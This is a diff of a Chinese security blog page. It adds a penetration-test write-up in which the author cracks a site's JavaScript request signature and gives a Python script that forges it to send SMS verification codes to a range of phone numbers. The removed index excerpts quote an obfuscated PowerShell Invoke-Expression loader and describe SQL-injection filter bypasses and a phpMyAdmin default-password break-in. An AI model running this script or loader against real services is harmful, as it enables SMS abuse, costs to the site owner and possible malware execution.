@@ -6,18 +6,35 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://doggy-test.github.io">
-  <title>Doggy的博客</title>
+  <title>遍历手机号发送验证码(二) | Doggy的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="南京邮电大学2014级">
-<meta name="keywords" content="信息安全，渗透测试">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Doggy的博客">
-<meta property="og:url" content="https://doggy-test.github.io/index.html">
+  <meta name="description" content="之前写在笔记上的一次记录，转一下   直觉告诉我们这里可能有一个高达50rmb的遍历手机号发送验证短信的问题，抓包看下请求">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="遍历手机号发送验证码(二)">
+<meta property="og:url" content="https://doggy-test.github.io/2019/07/26/遍历手机号发送验证码-二/index.html">
 <meta property="og:site_name" content="Doggy的博客">
-<meta property="og:description" content="南京邮电大学2014级">
+<meta property="og:description" content="之前写在笔记上的一次记录，转一下   直觉告诉我们这里可能有一个高达50rmb的遍历手机号发送验证短信的问题，抓包看下请求">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/01.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/02.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/03-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/04-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/05-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/06-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/07-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/08-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/09-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/10-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/11-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/12-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/13-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/14-.png">
+<meta property="og:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/15-.png">
+<meta property="og:updated_time" content="2019-07-26T07:32:17.143Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Doggy的博客">
-<meta name="twitter:description" content="南京邮电大学2014级">
+<meta name="twitter:title" content="遍历手机号发送验证码(二)">
+<meta name="twitter:description" content="之前写在笔记上的一次记录，转一下   直觉告诉我们这里可能有一个高达50rmb的遍历手机号发送验证短信的问题，抓包看下请求">
+<meta name="twitter:image" content="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/01.png">
   
     <link rel="alternative" href="/atom.xml" title="Doggy的博客" type="application/atom+xml">
   
@@ -145,16 +162,14 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-遍历手机号发送验证码-二" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-遍历手机号发送验证码-二" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/26/遍历手机号发送验证码-二/">遍历手机号发送验证码(二)</a>
+    <h1 class="article-title" itemprop="name">
+      遍历手机号发送验证码(二)
     </h1>
   
 
@@ -172,174 +187,59 @@
 </blockquote>
 <p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/01.png" alt=""></p>
 <p>直觉告诉我们这里可能有一个高达50rmb的遍历手机号发送验证短信的问题，抓包看下请求</p>
-        
-          <a class="article-more-a" href="/2019/07/26/遍历手机号发送验证码-二/#more">more >></a>
-        
-      
+<a id="more"></a>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/02.png" alt="image"></p>
+<p>当试着更改phone时，发现后端返回了一个错误</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/03-.png" alt="image"></p>
+<p>猜测bread应该是签名<br>由于是网页端发起的请求，所以肯定是js进行签名，那么只要找到签名方式就可以了<br>先看看加载了几个js</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/04-.png" alt="image"></p>
+<p>只有1个，那就好办了，打开它，我们搜索下关键词<br>根据请求参数timeStamp找到如下代码</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/05-.png" alt="image"></p>
+<p>看到了bread，应该就是这段发起了请求</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/06-.png" alt="image"></p>
+<p>调用了secureSignature函数，再去源代码里搜索下secureSignature</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/07-.png" alt="image"></p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/08-.png" alt="image"></p>
+<p>这样加密方式就找到了，参数t猜测是带过去的get参数，试着验证下<br>稍改下代码，得到o+n</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/09-.png" alt="image"></p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/10-.png" alt="image"></p>
+<p>用这个作为o，加上n再来一次</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/11-.png" alt="image"></p>
+<p>看到结果匹配上了</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/12-.png" alt="image"></p>
+<p>证明确实正确，那么可以用python写出个批量脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#encoding=UTF-8</span></div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encyrpt</span><span class="params">(pkg)</span>:</span></div><div class="line">    result = <span class="string">''</span></div><div class="line">    key_list = pkg.split(<span class="string">"&amp;"</span>)</div><div class="line">    key_list.sort()</div><div class="line">    token = <span class="string">"64688142ca8a14ef1307fd2794771d37"</span></div><div class="line">    pkg = <span class="string">''</span>.join(key_list)</div><div class="line">    sign = hashlib.md5(hashlib.md5(pkg+token).hexdigest()+token).hexdigest()</div><div class="line">    <span class="keyword">return</span> sign</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</div><div class="line">        phone = <span class="string">"132888888"</span> + str(i).zfill(<span class="number">2</span>)</div><div class="line">        headers = &#123;</div><div class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36 Html5Plus/1.0"</span></div><div class="line">        &#125;</div><div class="line">        pkg = <span class="string">"phone="</span> + phone + <span class="string">"&amp;timeStamp=&#123;&#125;"</span>.format(str(time.time()).split(<span class="string">"."</span>)[<span class="number">0</span>]+str(time.time()).split(<span class="string">"."</span>)[<span class="number">1</span>].zfill(<span class="number">3</span>))</div><div class="line">        url = <span class="string">"http://xxx.com/customer/login/code/?&#123;&#125;&amp;bread=&#123;&#125;"</span>.format(pkg,encyrpt(pkg))</div><div class="line">        <span class="keyword">print</span> url</div><div class="line">        r = requests.get(url,headers=headers)</div><div class="line">        <span class="keyword">print</span> r.text</div></pre></td></tr></table></figure>
+<p>当然这个t只是我们猜测的结果，如果想知道具体值，除了去源码分析，还可以利用调试</p>
+<p>在相应的函数下设置断点</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/13-.png" alt="image"></p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/14-.png" alt="image"></p>
+<p>果然如此</p>
+<p><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/blog_images/15-.png" alt="image"></p>
+<p>虽然最后可惜他还是针对手机号码进行了限制～</p>
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试/" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/26/遍历手机号发送验证码-二/">展开全文 >></a>
-        </p>
       
 
       
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-一次解密" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/23/一次解密/">一次解密</a>
-    </h1>
-  
-
-        
-        <a href="/2019/07/23/一次解密/" class="archive-article-date">
-  	<time datetime="2019-07-22T23:23:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-23</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>在土司看到这样一篇帖子，要求解密 <a href="https://www.t00ls.net/viewthread.php?tid=51505&amp;rpid=853415&amp;ordertype=0&amp;page=1#pid853415" target="_blank" rel="external">https://www.t00ls.net/viewthread.php?tid=51505&amp;rpid=853415&amp;ordertype=0&amp;page=1#pid853415</a></p>
-</blockquote>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Invoke-Expression</span> $(<span class="built_in">New-Object</span> IO.StreamReader ($(<span class="built_in">New-Object</span> IO.Compression.DeflateStream ($(<span class="built_in">New-Object</span> IO.MemoryStream (,$([Convert]::FromBase64String(<span class="string">'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'</span>)))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();</div></pre></td></tr></table></figure>
-<p>注意到了 <em>$(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(</em></p>
-        
-          <a class="article-more-a" href="/2019/07/23/一次解密/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">加密解密</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试/" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/23/一次解密/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-遍历手机号发送短信验证码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/17/遍历手机号发送短信验证码/">遍历手机号发送短信验证码</a>
-    </h1>
-  
-
-        
-        <a href="/2019/07/17/遍历手机号发送短信验证码/" class="archive-article-date">
-  	<time datetime="2019-07-17T09:16:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了</p>
-<blockquote>
-<p>朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点ctf题目的意思，就记录一下</p>
-</blockquote>
-<p>注册页面是这样的，存在以下3步</p>
-<ol>
-<li>发送图形验证码</li>
-<li>校验验证码是否正确</li>
-<li>发送短信验证码</li>
-</ol>
-        
-          <a class="article-more-a" href="/2019/07/17/遍历手机号发送短信验证码/#more">more >></a>
-        
-      
-
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -370,18 +270,74 @@
 
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/07/17/遍历手机号发送短信验证码/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://doggy-test.github.io/2019/07/26/遍历手机号发送验证码-二/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
 
-
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2019/07/23/一次解密/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">一次解密</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
 
 
@@ -389,248 +345,10 @@
 
 
   
-    <article id="post-一次过狗oracle手工注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/08/09/一次过狗oracle手工注入/">一次过狗oracle手工注入</a>
-    </h1>
+    <div class="duoshuo"></div>
   
 
-        
-        <a href="/2017/08/09/一次过狗oracle手工注入/" class="archive-article-date">
-  	<time datetime="2017-08-09T05:40:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01.前言"></a>0x01.前言</h4><blockquote>
-<p>狗不是好狗，比较容易绕过，但也是第一次手工注入oracle，所以记录一下</p>
-</blockquote>
-<h4 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02.过程"></a>0x02.过程</h4><p>网站的url长这样:<a href="http://www.xxx.cn/xxx.php?zjid=1000" target="_blank" rel="external">http://www.xxx.cn/xxx.php?zjid=1000</a><br>经过简单的测试，过滤了空格以及union select</p>
-<p>通过fuzz，%0b没有过滤，union select可以通过简单的大小写转换绕过，怕是出现在ctf里的送分题。这样就简单了，简单改下sqlmap的tamper，成功跑出了数据库相关信息<br>
-        
-          <a class="article-more-a" href="/2017/08/09/一次过狗oracle手工注入/#more">more >></a>
-        
-      
 
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试/" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/08/09/一次过狗oracle手工注入/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-7-12笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/12/7-12笔记/">7.12笔记</a>
-    </h1>
-  
-
-        
-        <a href="/2017/07/12/7-12笔记/" class="archive-article-date">
-  	<time datetime="2017-07-12T08:23:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-07-12</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong><em>1.dns解析</em></strong></p>
-<blockquote>
-<p><a href="https://ricterz.me/posts/CUIT%20CTF%20Pentest%20Writeup" target="_blank" rel="external">https://ricterz.me/posts/CUIT%20CTF%20Pentest%20Writeup</a></p>
-</blockquote>
-<p>python的dnspython模块可以用来进行dns的查询。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#encoding=UTF-8</span></div><div class="line"><span class="keyword">import</span> dns.resolver</div><div class="line">domain = <span class="string">"njupt.edu.cn"</span></div><div class="line">query_list = [<span class="string">"A"</span>,<span class="string">"MX"</span>,<span class="string">"NS"</span>,<span class="string">"CNAME"</span>]</div><div class="line"><span class="string">"""</span></div><div class="line">A记录：将主机名转换成IP地址 </div><div class="line">MX记录：邮件交换记录，定义邮件服务器的域名 </div><div class="line">CNAME记录：别名记录，实现域名间的映射 。</div><div class="line">NS记录：标记区域的域名服务器及授权子域 ，用来指定该域名由哪个DNS服务器来进行解析</div><div class="line">"""</div><div class="line"><span class="keyword">for</span> _query <span class="keyword">in</span> query_list:</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">print</span> _query + <span class="string">":"</span></div><div class="line">        result = dns.resolver.query(domain,_query)</div><div class="line">        <span class="keyword">for</span> each_answer <span class="keyword">in</span> result.response.answer:</div><div class="line">            <span class="keyword">print</span> each_answer</div><div class="line">    <span class="keyword">except</span> Exception,e:</div><div class="line">        <span class="keyword">print</span> <span class="string">"No result"</span></div></pre></td></tr></table></figure></p>
-<p>结果为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">A:</div><div class="line">njupt.edu.cn. <span class="number">6607</span> IN A <span class="number">202.119</span><span class="number">.230</span><span class="number">.8</span></div><div class="line">njupt.edu.cn. <span class="number">6607</span> IN A <span class="number">202.119</span><span class="number">.230</span><span class="number">.10</span></div><div class="line">MX:</div><div class="line">njupt.edu.cn. <span class="number">6722</span> IN MX <span class="number">1</span> em1.njupt.edu.cn.</div><div class="line">NS:</div><div class="line">njupt.edu.cn. <span class="number">6764</span> IN NS ns.njupt.edu.cn.</div><div class="line">njupt.edu.cn. <span class="number">6764</span> IN NS dns.njupt.edu.cn.</div><div class="line">CNAME:</div><div class="line">No result</div></pre></td></tr></table></figure></p>
-        
-          <a class="article-more-a" href="/2017/07/12/7-12笔记/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/笔记/" class="article-tag-list-link color3">笔记</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/07/12/7-12笔记/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-某次渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/06/02/某次渗透/">某次渗透</a>
-    </h1>
-  
-
-        
-        <a href="/2017/06/02/某次渗透/" class="archive-article-date">
-  	<time datetime="2017-06-02T00:18:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>一次未成功的渗透测试</p>
-</blockquote>
-<p>花了两个多小时写了个简单调用zoomapi然后批量检测的poc框架，就拿phpmyadmin试了下，运气不错，遇到个root/123456的默认口令位于8000端口的phpmyadmin<br><img src="https://doggy-1253136973.cos.ap-chengdu.myqcloud.com/test/note8_1.png" alt="image"><br>看到个moodle的库名，百度了下，是个常见的教育系统。然后就是简单测试了下文件读取的权限（select<br> @@basedir）,有读取权限，但是要写入shell的话<br> 要绝对路径。</p>
-        
-          <a class="article-more-a" href="/2017/06/02/某次渗透/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/渗透测试/" class="article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/06/02/某次渗透/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
